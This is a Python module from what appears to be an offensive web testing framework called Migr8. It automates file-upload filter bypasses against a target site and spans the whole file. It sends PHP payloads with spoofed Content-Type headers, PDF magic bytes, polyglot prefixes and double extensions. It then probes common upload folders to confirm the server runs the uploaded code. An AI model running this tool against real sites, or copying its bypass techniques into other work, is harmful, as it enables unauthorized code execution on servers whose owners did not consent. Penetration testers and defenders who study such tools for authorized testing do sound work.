"""
Content-Type Bypass Module for Migr8 Framework
Upload PHP payloads with spoofed Content-Type headers to bypass restrictions
"""

import requests
import os
import time
from urllib.parse import urljoin
from utils.logger import logger
from utils.bypasses import USER_AGENTS, BYPASS_CONTENT_TYPES, MAGIC_BYTES, POLYGLOT_PREFIXES
import random

class ContentTypeBypass:
    """Test Content-Type bypass techniques for upload restrictions"""

    def __init__(self, timeout=30):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': random.choice(USER_AGENTS)
        })

    def test_pdf_bypass(self, target_url, php_file_path, field_name='file'):
        """
        Test PHP payload upload with PDF Content-Type spoofing

        Args:
            target_url (str): Upload endpoint URL
            php_file_path (str): Path to PHP payload file
            field_name (str): Form field name for upload

        Returns:
            dict: PDF bypass test results
        """
        logger.info("Testing PDF Content-Type bypass")

        if not os.path.exists(php_file_path):
            logger.error(f"PHP file not found: {php_file_path}")
            return None

        try:
            with open(php_file_path, 'rb') as f:
                php_content = f.read()

            # Generate unique filename
            timestamp = str(int(time.time()))
            test_filename = f"test_{timestamp}.php"

            # Test different PDF bypass techniques
            bypass_techniques = [
                {
                    'name': 'Basic PDF Content-Type',
                    'content_type': 'application/pdf',
                    'content': php_content,
                    'filename': test_filename
                },
                {
                    'name': 'PDF with PHP extension disguised as PDF',
                    'content_type': 'application/pdf',
                    'content': php_content,
                    'filename': test_filename.replace('.php', '.pdf')
                },
                {
                    'name': 'PDF Magic Bytes + PHP Content',
                    'content_type': 'application/pdf',
                    'content': MAGIC_BYTES['PDF'] + b'\n' + php_content,
                    'filename': test_filename
                },
                {
                    'name': 'Polyglot PDF/PHP File',
                    'content_type': 'application/pdf',
                    'content': POLYGLOT_PREFIXES['PDF_PHP'] + php_content,
                    'filename': test_filename
                },
                {
                    'name': 'Double Extension with PDF Content-Type',
                    'content_type': 'application/pdf',
                    'content': php_content,
                    'filename': test_filename.replace('.php', '.pdf.php')
                }
            ]

            results = []

            for technique in bypass_techniques:
                logger.info(f"Testing: {technique['name']}")

                upload_result = self._test_upload_technique(
                    target_url,
                    technique,
                    field_name
                )

                if upload_result:
                    results.append(upload_result)

            # Summary
            successful_bypasses = [r for r in results if r['upload_success']]
            logger.info(f"PDF bypass test complete: {len(successful_bypasses)}/{len(results)} techniques successful")

            return {
                'php_file': php_file_path,
                'techniques_tested': len(bypass_techniques),
                'bypass_results': results,
                'successful_bypasses': successful_bypasses
            }

        except Exception as e:
            logger.error(f"PDF bypass test failed: {str(e)}")
            return None

    def test_multiple_content_types(self, target_url, payload_file, field_name='file'):
        """
        Test payload upload with multiple Content-Type spoofing attempts

        Args:
            target_url (str): Upload endpoint URL
            payload_file (str): Path to payload file
            field_name (str): Form field name

        Returns:
            dict: Multiple Content-Type bypass results
        """
        logger.info("Testing multiple Content-Type bypasses")

        if not os.path.exists(payload_file):
            logger.error(f"Payload file not found: {payload_file}")
            return None

        try:
            with open(payload_file, 'rb') as f:
                payload_content = f.read()

            # Generate unique filename
            timestamp = str(int(time.time()))
            original_filename = os.path.basename(payload_file)
            base_name, ext = os.path.splitext(original_filename)
            test_filename = f"{base_name}_{timestamp}{ext}"

            results = []

            # Test common Content-Types for bypass
            priority_content_types = [
                'application/pdf',
                'image/jpeg',
                'image/png',
                'application/msword',
                'text/plain',
                'application/octet-stream'
            ]

            for content_type in priority_content_types:
                logger.info(f"Testing Content-Type: {content_type}")

                technique = {
                    'name': f'Content-Type Bypass: {content_type}',
                    'content_type': content_type,
                    'content': payload_content,
                    'filename': test_filename
                }

                upload_result = self._test_upload_technique(
                    target_url,
                    technique,
                    field_name
                )

                if upload_result:
                    results.append(upload_result)

                # Small delay to avoid overwhelming server
                time.sleep(0.5)

            successful_bypasses = [r for r in results if r['upload_success']]
            logger.info(f"Content-Type bypass test complete: {len(successful_bypasses)}/{len(results)} successful")

            return {
                'payload_file': payload_file,
                'content_types_tested': len(priority_content_types),
                'bypass_results': results,
                'successful_bypasses': successful_bypasses
            }

        except Exception as e:
            logger.error(f"Content-Type bypass test failed: {str(e)}")
            return None

    def test_execution_after_bypass(self, base_url, bypass_results):
        """
        Test execution of successfully uploaded files from bypass attempts

        Args:
            base_url (str): Base URL for testing execution
            bypass_results (dict): Results from bypass tests

        Returns:
            dict: Execution test results
        """
        logger.info("Testing execution of bypassed uploads")

        if not bypass_results or 'successful_bypasses' not in bypass_results:
            logger.warning("No successful bypasses to test for execution")
            return None

        execution_results = []

        for bypass in bypass_results['successful_bypasses']:
            filename = bypass['filename']
            logger.info(f"Testing execution: {filename}")

            execution_result = self._test_file_execution(base_url, filename)
            if execution_result:
                execution_result['bypass_technique'] = bypass['technique_name']
                execution_results.append(execution_result)

        # Summary
        executed_files = [r for r in execution_results if r['executed']]
        logger.info(f"Execution test complete: {len(executed_files)}/{len(execution_results)} files executed")

        return {
            'tested_files': len(execution_results),
            'execution_results': execution_results,
            'executed_files': executed_files
        }

    def _test_upload_technique(self, target_url, technique, field_name):
        """Test a specific upload bypass technique"""
        try:
            files = {
                field_name: (
                    technique['filename'],
                    technique['content'],
                    technique['content_type']
                )
            }

            data = {
                'submit': 'Upload',
                'action': 'upload',
                'MAX_FILE_SIZE': '10485760'
            }

            response = self.session.post(
                target_url,
                files=files,
                data=data,
                timeout=self.timeout,
                allow_redirects=True
            )

            upload_success = self._analyze_upload_success(response)

            result = {
                'technique_name': technique['name'],
                'filename': technique['filename'],
                'content_type': technique['content_type'],
                'status_code': response.status_code,
                'response_length': len(response.content),
                'upload_success': upload_success,
                'response_preview': response.text[:300]
            }

            if upload_success:
                logger.success(f"Upload successful: {technique['name']}")
            else:
                logger.error(f"Upload failed: {technique['name']}")

            return result

        except Exception as e:
            logger.error(f"Upload technique failed: {str(e)}")
            return None

    def _test_file_execution(self, base_url, filename):
        """Test if uploaded file executes on the server"""
        # Common upload paths to test
        test_paths = [
            '', 'uploads/', 'upload/', 'files/', 'file/', 'temp/', 'tmp/',
            'media/', 'attachments/', 'data/'
        ]

        for path in test_paths:
            test_url = urljoin(base_url.rstrip('/') + '/', path + filename)

            try:
                response = self.session.get(test_url, timeout=self.timeout)

                if response.status_code == 200:
                    executed = self._check_payload_execution(response, filename)

                    if executed:
                        logger.success(f"File execution confirmed: {test_url}")
                        return {
                            'filename': filename,
                            'execution_url': test_url,
                            'executed': True,
                            'status_code': response.status_code,
                            'response_preview': response.text[:200]
                        }

            except requests.exceptions.RequestException as e:
                logger.debug(f"Request failed for {test_url}: {str(e)}")
                continue

        logger.warning(f"File execution not confirmed: {filename}")
        return {
            'filename': filename,
            'executed': False,
            'tested_paths': test_paths
        }

    def comprehensive_bypass_test(self, target_url, base_url, payload_file):
        """
        Perform comprehensive Content-Type bypass testing

        Args:
            target_url (str): Upload endpoint URL
            base_url (str): Base URL for execution testing
            payload_file (str): Path to payload file

        Returns:
            dict: Comprehensive bypass test results
        """
        logger.info("Starting comprehensive Content-Type bypass test")

        comprehensive_results = {
            'payload_file': payload_file,
            'pdf_bypass_test': None,
            'multiple_content_type_test': None,
            'execution_test': None,
            'summary': {}
        }

        # Test 1: PDF-specific bypass
        if payload_file.endswith('.php'):
            pdf_results = self.test_pdf_bypass(target_url, payload_file)
            comprehensive_results['pdf_bypass_test'] = pdf_results

        # Test 2: Multiple Content-Type bypass
        content_type_results = self.test_multiple_content_types(target_url, payload_file)
        comprehensive_results['multiple_content_type_test'] = content_type_results

        # Test 3: Execution testing
        if content_type_results and content_type_results['successful_bypasses']:
            execution_results = self.test_execution_after_bypass(base_url, content_type_results)
            comprehensive_results['execution_test'] = execution_results

        # Generate summary
        total_bypasses = 0
        total_executions = 0

        if comprehensive_results['pdf_bypass_test']:
            total_bypasses += len(comprehensive_results['pdf_bypass_test']['successful_bypasses'])

        if comprehensive_results['multiple_content_type_test']:
            total_bypasses += len(comprehensive_results['multiple_content_type_test']['successful_bypasses'])

        if comprehensive_results['execution_test']:
            total_executions = len(comprehensive_results['execution_test']['executed_files'])

        comprehensive_results['summary'] = {
            'total_successful_bypasses': total_bypasses,
            'total_executions_confirmed': total_executions,
            'bypass_success_rate': f"{total_bypasses}/{(5 + 6)}",  # PDF techniques + Content-Type techniques
            'execution_success_rate': f"{total_executions}/{total_bypasses}" if total_bypasses > 0 else "0/0"
        }

        logger.info(f"Comprehensive bypass test complete: {total_bypasses} bypasses, {total_executions} executions")

        return comprehensive_results

    def _analyze_upload_success(self, response):
        """Analyze response to determine upload success"""
        status_code = response.status_code
        content = response.text.lower()

        # Success indicators
        success_indicators = [
            'upload successful', 'file uploaded', 'upload complete',
            'successfully uploaded', 'file saved'
        ]

        # Content-Type specific error indicators
        content_type_errors = [
            'invalid file type', 'file type not allowed', 'content type not supported',
            'only pdf files allowed', 'invalid content type'
        ]

        if status_code in [200, 201, 302]:
            has_success = any(indicator in content for indicator in success_indicators)
            has_content_error = any(error in content for error in content_type_errors)

            if has_success and not has_content_error:
                return True
            elif not has_content_error and 'error' not in content:
                return True

        return False

    def _check_payload_execution(self, response, filename):
        """Check if payload executed successfully"""
        if response.status_code != 200:
            return False

        content = response.text.lower()
        content_type = response.headers.get('content-type', '').lower()

        # Check based on file type
        if filename.endswith('.php'):
            php_indicators = [
                'php version', 'server_software', 'migr8 php test',
                'current time:', 'upload directory:', '<?php'
            ]
            return any(indicator in content for indicator in php_indicators)

        elif filename.endswith('.aspx'):
            aspx_indicators = [
                'aspx upload test', '.net framework', 'migr8 aspx test',
                'server software:', 'current time:'
            ]
            return any(indicator in content for indicator in aspx_indicators)

        # Generic execution indicators
        if content_type.startswith('text/html'):
            generic_indicators = [
                'migr8', 'upload test', 'execution', 'server:', 'current time:'
            ]
            return any(indicator in content for indicator in generic_indicators)

        return False

    def close(self):
        """Close the session"""
        self.session.close()
